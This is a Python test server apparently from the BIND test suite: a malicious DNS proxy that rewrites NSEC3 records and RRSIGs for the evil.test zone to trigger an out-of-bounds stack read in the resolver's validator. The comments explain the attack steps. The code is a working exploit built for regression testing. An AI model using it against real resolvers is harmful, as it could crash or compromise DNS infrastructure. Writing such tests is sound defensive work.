# Copyright (C) Internet Systems Consortium, Inc. ("ISC")
#
# SPDX-License-Identifier: MPL-2.0
#
# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0. If a copy of the MPL was not distributed with this
# file, you can obtain one at https://mozilla.org/MPL/2.0/.
#
# See the COPYRIGHT file distributed with this work for additional
# information regarding copyright ownership.

from collections.abc import Iterable
from pathlib import Path
from typing import cast

import functools
import glob
import os
import time

from dns.rdtypes.ANY.NSEC3 import NSEC3
from dns.rdtypes.util import Bitmap

import dns.dnssec
import dns.name
import dns.rcode
import dns.rdata
import dns.rdataclass
import dns.rdatatype
import dns.rrset
import dns.tokenizer
import dns.zone

from isctest.asyncserver import (
    AsyncDnsServer,
    DnsResponseSend,
    ForwarderHandler,
    QueryContext,
    ResponseAction,
    ResponseHandlerWrapper,
)
from isctest.zone import FileZoneKey

# The malicious proxy relays every query to the real signed authoritative
# server for evil.test and tampers with the NSEC3 proofs on the way back to
# trigger CWE-125 (out-of-bounds stack read) in validator.c:344:
#
#   1. The A response for xxx.evil.test has its NSEC3 mutated so the proof
#      breaks, forcing the resolver into proveunsecure() and a DS fetch.
#   2. The DS response has a crafted NSEC3 (next-hash length 200, exceeding
#      the 155-byte buffer) injected at position 0, with NXDOMAIN rewritten
#      to NOERROR so DS validation succeeds via the surviving, unmodified
#      NSEC3 (opt-out coverage).
#   3. The ncache stores the crafted NSEC3 (200-byte next hash) ahead of the
#      original, so isdelegation() hits it first and memcmp() reads past the
#      buffer.


class Attack:
    """
    The signing material and NSEC3 targets shared by the proxy handlers, plus
    the operations that tamper with the relayed responses.  Reads the signed
    zone and loads the ZSK at construction; the first NSEC3 alphabetically is
    the inject target, the second is the modify target.
    """

    ZONE = "evil.test."
    NSEC3_TTL = 86400

    # Crafted NSEC3 next-hash length; exceeds the validator's 155-byte buffer.
    CRAFTED_NEXT_LENGTH = 200
    # Crafted NSEC3 type bitmap.
    CRAFTED_WINDOWS = Bitmap.from_text(dns.tokenizer.Tokenizer("A RRSIG")).windows

    # RRSIG validity window, computed at startup for portability.
    _NOW = int(time.time())
    RRSIG_INCEPTION = _NOW - 3600
    RRSIG_EXPIRATION = _NOW + 30 * 86400

    def __init__(self) -> None:
        self._discover_nsec3_targets()
        self._load_zsk()

    def _discover_nsec3_targets(
        self, zone_file: str = "../ns6/evil.test.db.signed"
    ) -> None:
        """
        Set the (name, NSEC3) inject and modify targets from the signed zone.
        """
        zone = dns.zone.from_file(zone_file, origin=self.ZONE, relativize=False)
        records = sorted(
            (name, cast(NSEC3, rdata))
            for name, _, rdata in zone.iterate_rdatas(dns.rdatatype.NSEC3)
        )
        assert len(records) >= 2, f"need >= 2 NSEC3 records, found {len(records)}"
        inject, modify, *_ = records
        self._inject_name, self._inject_nsec3 = inject
        self._modify_name, _ = modify

    def _load_zsk(self, key_dir: str = "../ns6") -> None:
        """
        Load the zone's ZSK (not the KSK) as a FileZoneKey.
        """
        zsks = [
            key
            for keyfile in sorted(glob.glob(f"{key_dir}/K{self.ZONE}+*.key"))
            if not (key := FileZoneKey(Path(keyfile).stem, keydir=key_dir)).is_ksk()
        ]
        assert zsks, f"no ZSK found in {key_dir}"
        self._zsk, *_ = zsks

    def sign(
        self,
        rrset: dns.rrset.RRset,
        signer_name: dns.name.Name = dns.name.from_text("evil.test."),
    ) -> dns.rdata.Rdata:
        """
        Sign an RRset with the zone's ZSK and return the RRSIG rdata.
        """
        return dns.dnssec.sign(
            rrset,
            self._zsk.private_key,
            signer_name,
            self._zsk.dnskey[0],
            inception=self.RRSIG_INCEPTION,
            expiration=self.RRSIG_EXPIRATION,
            verify=True,
        )

    def overrun_nsec3_next(
        self,
        nsec3: NSEC3,
        windows: Iterable[tuple[int, bytes]] | None = None,
    ) -> NSEC3:
        """
        A copy of an NSEC3 with a CRAFTED_NEXT_LENGTH-byte next hash.
        """
        padded_next = nsec3.next + os.urandom(
            self.CRAFTED_NEXT_LENGTH - len(nsec3.next)
        )
        return NSEC3(
            nsec3.rdclass,
            nsec3.rdtype,
            nsec3.algorithm,
            nsec3.flags,
            nsec3.iterations,
            nsec3.salt,
            padded_next,
            tuple(nsec3.windows if windows is None else windows),
        )

    @functools.cached_property
    def crafted_nsec3(self) -> dns.rrset.RRset:
        """
        An NSEC3 whose next-hash overruns the validator's buffer.
        """
        crafted = self.overrun_nsec3_next(self._inject_nsec3, self.CRAFTED_WINDOWS)
        return dns.rrset.from_rdata(self._inject_name, self.NSEC3_TTL, crafted)

    @functools.cached_property
    def crafted_rrsig(self) -> dns.rrset.RRset:
        """
        The signature for the crafted NSEC3.  Signing happens on the first
        query rather than at startup, so that the server also starts on
        platforms whose cryptography cannot sign deterministically.
        """
        return dns.rrset.from_rdata(
            self._inject_name, self.NSEC3_TTL, self.sign(self.crafted_nsec3)
        )

    def covers_inject(self, name: dns.name.Name) -> bool:
        return name == self._inject_name

    def covers_modify(self, name: dns.name.Name) -> bool:
        return name == self._modify_name


ATTACK = Attack()


class RelayForwarder(ForwarderHandler):
    """
    Relay the given query types -- or every query, if none are given -- to the
    real authoritative server for evil.test.
    """

    target = "10.53.0.6"

    def __init__(self, *qtypes: dns.rdatatype.RdataType) -> None:
        super().__init__()
        self._qtypes = qtypes

    def match(self, qctx: QueryContext) -> bool:
        return not self._qtypes or qctx.qtype in self._qtypes


class DsInjector(ResponseHandlerWrapper):
    """
    Inject the crafted NSEC3 at position 0 of the DS response's authority.
    """

    def _modify_response(
        self, qctx: QueryContext, response_action: ResponseAction
    ) -> None:
        assert isinstance(
            response_action, DnsResponseSend
        ), "DsInjector can only wrap handlers that yield DnsResponseSend"
        response = response_action.response
        assert response.rcode() == dns.rcode.NXDOMAIN, "expected an opt-out denial"
        response.set_rcode(dns.rcode.NOERROR)

        authority = [ATTACK.crafted_nsec3, ATTACK.crafted_rrsig]
        for rrset in response.authority:
            if ATTACK.covers_inject(rrset.name):
                continue
            authority.append(rrset)
        response.authority = authority


class ProofBreaker(ResponseHandlerWrapper):
    """
    Overrun the modify-target NSEC3 in the A response and re-sign it.
    """

    def _modify_response(
        self, qctx: QueryContext, response_action: ResponseAction
    ) -> None:
        assert isinstance(
            response_action, DnsResponseSend
        ), "ProofBreaker can only wrap handlers that yield DnsResponseSend"
        response = response_action.response
        authority: list[dns.rrset.RRset] = []
        mutated: dns.rrset.RRset | None = None
        for rrset in response.authority:
            if rrset.rdtype == dns.rdatatype.NSEC3 and ATTACK.covers_modify(rrset.name):
                mutated = dns.rrset.RRset(rrset.name, rrset.rdclass, rrset.rdtype)
                mutated.update_ttl(rrset.ttl)
                for rdata in rrset:
                    mutated.add(ATTACK.overrun_nsec3_next(rdata))
                authority.append(mutated)
            elif rrset.rdtype == dns.rdatatype.RRSIG:
                authority.append(self._resign_covering_nsec3(rrset, mutated))
            else:
                authority.append(rrset)
        response.authority = authority

    def _resign_covering_nsec3(
        self, rrsig_rrset: dns.rrset.RRset, mutated: dns.rrset.RRset | None
    ) -> dns.rrset.RRset:
        if mutated is None:
            return rrsig_rrset

        covers_nsec3 = any(
            rdata.type_covered == dns.rdatatype.NSEC3 for rdata in rrsig_rrset
        )
        if not (covers_nsec3 and ATTACK.covers_modify(rrsig_rrset.name)):
            return rrsig_rrset

        template = next(iter(rrsig_rrset))
        rrsig_rdata = ATTACK.sign(mutated, template.signer)

        resigned = dns.rrset.RRset(
            rrsig_rrset.name, dns.rdataclass.IN, dns.rdatatype.RRSIG
        )
        resigned.update_ttl(rrsig_rrset.ttl)
        resigned.add(rrsig_rdata)
        return resigned


def main() -> None:
    server = AsyncDnsServer(default_aa=False, default_rcode=dns.rcode.NOERROR)
    server.install_response_handlers(
        DsInjector(RelayForwarder(dns.rdatatype.DS)),
        ProofBreaker(RelayForwarder(dns.rdatatype.A, dns.rdatatype.AAAA)),
        RelayForwarder(),
    )
    server.run()


if __name__ == "__main__":
    main()
